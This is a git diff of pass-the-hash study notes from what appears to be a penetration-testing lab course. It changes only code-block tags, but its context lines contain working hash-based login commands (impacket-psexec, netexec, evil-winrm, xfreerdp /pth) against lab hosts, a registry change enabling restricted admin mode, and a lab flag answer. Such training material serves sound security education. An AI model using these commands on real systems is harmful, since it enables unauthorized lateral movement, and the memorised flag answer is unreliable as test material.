@@ -88,7 +88,7 @@ PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.ht
 ## Pass the Hash with Impacket (Linux)
 ### Pass the Hash with Impacket PsExec
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -117,7 +117,7 @@ There are several other tools in the Impacket toolkit we can use for command exe
 
 ### Pass the Hash with NetExec
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 SMB         172.16.1.10   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:.) (signing:True) (SMBv1:False)
@@ -130,7 +130,7 @@ If we want to perform the same actions but attempt to authenticate to each host 
 
 ### NetExec - Command Execution
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
 
 SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
@@ -144,7 +144,7 @@ If SMB is blocked or we don't have administrative rights, we can use this altern
 
 ### Pass the Hash with evil-winrm
   
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 Evil-WinRM shell v3.3
@@ -173,7 +173,7 @@ c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v Disa
 ### Pass the Hash using RDP
 Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:
 
-```sh
+```shellsession
 masterofblafu@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
 [15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
@@ -197,7 +197,7 @@ Authenticate to **10.129.15.20** (ACADEMY-PWATTACKS-LM-MS01) with user `Administ
 1. Access the target machine using any Pass-the-Hash tool. Submit the contents of the file located at C:\pth.txt. **Answer: G3t_4CCE$$_V1@_PTH**
    - `$ xfreerdp /v:10.129.15.20 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453` → Try the RDP PtH attack but got this error: "Account restrictions are preventing this user from signing in."
    - Enable restricted admin mode to allow PtH and try the RDP PtH attack again (and it works):
-        ```sh
+        ```shellsession
         $ evil-winrm -i 10.129.15.20 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
                                         
         Evil-WinRM shell v3.5
@@ -439,7 +439,7 @@ Authenticate to **10.129.15.20** (ACADEMY-PWATTACKS-LM-MS01) with user `Administ
         <SNIP>
         ```
     - PtH attack via **evil-winrm** works but via **impacket-psexec** not: 
-        ```sh
+        ```shellsession
         $ impacket-psexec john@10.129.15.37 -hashes :c4b0e1b10c7ce2c4723b4e2407ef81a2
         Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
